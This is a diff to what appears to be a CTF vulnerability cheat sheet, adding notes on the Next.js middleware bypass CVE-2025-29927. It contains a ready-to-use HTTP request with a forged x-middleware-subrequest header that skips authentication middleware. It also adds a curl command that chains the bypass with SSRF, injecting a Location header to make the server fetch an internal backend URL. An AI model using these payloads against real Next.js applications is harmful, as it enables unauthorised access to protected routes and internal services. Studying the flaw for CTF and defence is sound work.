@@ -6,7 +6,7 @@ Specific CVEs and vulnerability patterns. For Node.js CVEs (flatnest, Happy-DOM)
 
 ## CVE-2025-29927: Next.js Middleware Bypass
 
-**Affected:** Next.js < 14.2.25
+**Affected:** Next.js < 14.2.25, also 15.x < 15.2.3
 
 ```http
 GET /protected/endpoint HTTP/1.1
@@ -15,6 +15,14 @@ x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 ```
 
 Bypasses authentication middleware, accesses protected endpoints, admin-only routes.
+
+**Chaining with SSRF (Note Keeper, Pragyan 2026):** After middleware bypass, inject `Location` header to trigger Next.js internal fetch to arbitrary URL:
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+     -H "Location: http://backend:4000/flag" \
+     https://target/api/login
+```
+Next.js processes the `Location` header and fetches the specified URL internally, enabling SSRF to internal services.
 
 ---
 
